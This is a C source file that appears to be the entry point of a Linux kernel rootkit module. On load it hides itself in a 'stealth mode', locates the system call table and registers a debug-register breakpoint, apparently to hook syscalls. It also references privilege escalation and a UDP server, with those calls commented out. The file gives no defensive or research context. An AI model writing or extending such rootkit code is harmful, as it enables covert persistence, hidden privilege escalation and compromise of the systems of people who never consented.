#include "utils.h"
#include "core.h"
#include "syscall_table.h"
#include "sys_escalation.h"
#include "server.h"
#include "module_hiding.h"
#include "hook.h"

/* load the LKM */
static int __init module_t_load(void)
{
  /* do the hiding process if in STEALTH MODE */
  if (STEALTH_MODE)
    do_hide_module();

  /* start the UDP server */
  //server_start();

  /* retrieve the system call table address */
  table_ptr = sys_call_table_retrieve();

  /* only for debug reasons */
  debug_print("Syscall table retrieved: %p", table_ptr);

  register_dr_breakpoint();
  
  return 0;
}

/* unload the LKM */
static void __exit module_t_unload(void)
{
  /* check if "root mode" is enabled and disable it */
  if (sys_esc_flag) {
    /* reset normal permissions behavior */
    //undo_priv_esc();
  }

  /* stop the UDP server */
  //server_stop();
  
}

module_init(module_t_load);
module_exit(module_t_unload);
